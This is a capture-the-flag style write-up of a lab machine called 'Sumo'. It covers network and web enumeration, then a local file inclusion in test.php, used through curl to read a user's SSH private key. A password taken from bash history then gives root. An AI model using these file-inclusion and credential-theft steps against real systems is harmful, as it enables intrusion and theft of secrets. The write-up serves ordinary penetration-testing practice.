---
title: Sumo
parent: Proving Grounds Practice
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance

```zsh
sudo arp-scan --interface=eth0 --localnet
```
![](../../../assets/images/Pasted%20image%2020260503064439.png)
*192.168.11.21*

```zsh
nmap -Pn -p- 192.168.11.21 --min-rate=5000 --open
```
![](../../../assets/images/Pasted%20image%2020260503072310.png)
- 22/tcp   open  ssh
- 80/tcp   open  http
- 139/tcp  open  netbios-ssn
- 443/tcp  open  https
- 445/tcp  open  microsoft-ds
- 3306/tcp open  mysql
- 9090/tcp open  zeus-admin

![](../../../assets/images/Pasted%20image%2020260503072244.png)
![](../../../assets/images/Pasted%20image%2020260503072335.png)

# Portscan
```zsh
nmap -Pn -p80 192.168.11.21 --min-rate=5000 -sVC -A
```
![](../../../assets/images/Pasted%20image%2020260503073220.png)

# Browser Access
http://192.168.11.21
![](../../../assets/images/Pasted%20image%2020260503073400.png)
![](../../../assets/images/Pasted%20image%2020260503073452.png)
- CMS Made Simple 2.2.15
# Enum Directory
```zsh
gobuster dir -u http://192.168.11.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,aspx,xml -b 403,404
```
![](../../../assets/images/Pasted%20image%2020260503075156.png)
- index.php            (Status: 200) [Size: 8358]
- modules              (Status: 301) [Size: 237] [--> http://192.168.11.21/modules/]
- uploads              (Status: 301) [Size: 237] [--> http://192.168.11.21/uploads/]
- doc                  (Status: 301) [Size: 233] [--> http://192.168.11.21/doc/]
- admin                (Status: 301) [Size: 235] [--> http://192.168.11.21/admin/]
![](../../../assets/images/Pasted%20image%2020260503143210.png)
- assets               (Status: 301) [Size: 236] [--> http://192.168.11.21/assets/]
- test.php             (Status: 200) [Size: 80] ![](../../../assets/images/Pasted%20image%2020260503143131.png)
size 80

- lib                  (Status: 301) [Size: 233] [--> http://192.168.11.21/lib/]
- config.php           (Status: 200) [Size: 0]
- robots.txt           (Status: 200) [Size: 79]
![](../../../assets/images/Pasted%20image%2020260503143037.png)
- error.html           (Status: 200) [Size: 80]
- tmp                  (Status: 301) [Size: 233] [--> http://192.168.11.21/tmp/]
- missing.html         (Status: 200) [Size: 168]
![](../../../assets/images/Pasted%20image%2020260503161022.png)
patrick

- phpinfo.php          (Status: 200) [Size: 17]

# fuzzing
```zsh
ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 80
```
![](../../../assets/images/Pasted%20image%2020260503171153.png)
file

# LFI

# enum4linux
```zsh
enum4linux 192.168.11.21
```
![](../../../assets/images/Pasted%20image%2020260503171737.png)
qiu

http://192.168.11.21:9090
![](../../../assets/images/Pasted%20image%2020260503145100.png)

# Enum directory
```zsh
gobuster dir -u http://192.168.11.21:9090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,asp,aspx,xml -b 403,404 --exclude-length=36506
```

---

# Initial Access
# LFI ssh_key
```zsh
curl 'http://192.168.11.21/test.php?file=/home/qiu/.ssh/id_rsa' -o qiu_rsa
```
![](../../../assets/images/Pasted%20image%2020260503173243.png)

```zsh
ssh -i qiu_rsa qiu@192.168.11.21
```
![](../../../assets/images/Pasted%20image%2020260503173317.png)

---

# Privilege Escalation

# web config.php
![](../../../assets/images/Pasted%20image%2020260503181853.png)

# db
![](../../../assets/images/Pasted%20image%2020260503175827.png)

![](../../../assets/images/Pasted%20image%2020260503181829.png)

![](../../../assets/images/Pasted%20image%2020260503184059.png)


```zsh
cat .bash_history
```
![](../../../assets/images/Pasted%20image%2020260503184134.png)
remarkablyawesomE

# sudo su
![](../../../assets/images/Pasted%20image%2020260503184247.png)
